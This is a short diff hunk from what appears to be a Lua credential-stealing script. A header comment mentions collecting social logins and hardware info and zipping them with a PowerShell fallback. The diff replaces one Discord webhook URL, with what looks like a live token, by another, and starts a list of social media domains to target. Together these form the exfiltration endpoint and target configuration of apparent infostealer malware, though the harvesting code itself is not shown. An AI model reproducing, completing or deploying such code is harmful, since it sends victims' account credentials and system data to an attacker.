@@ -6,7 +6,7 @@
     Social login grouping, hardware info collecting, and ZIP uses powershell fallback.
 --]]
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1493964782330577168/XZ4U3d4so35qor9X6Avk9PQHXMxBUPGqhvVBRgH9YsjXOCb5n1wR0xrFG8l0THgeZcm_"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1495247089800843364/vqsAe2jXiLCBm6M0rJs-WpHLONsDBTZn7O4LVgUUID3Lc8QO8Q3lzP7mybP_1XU8oGoj"
 
 SOCIAL_MEDIA_DOMAINS = {
     "discord.com", "discordapp.com", "twitter.com", "instagram.com", "facebook.com",
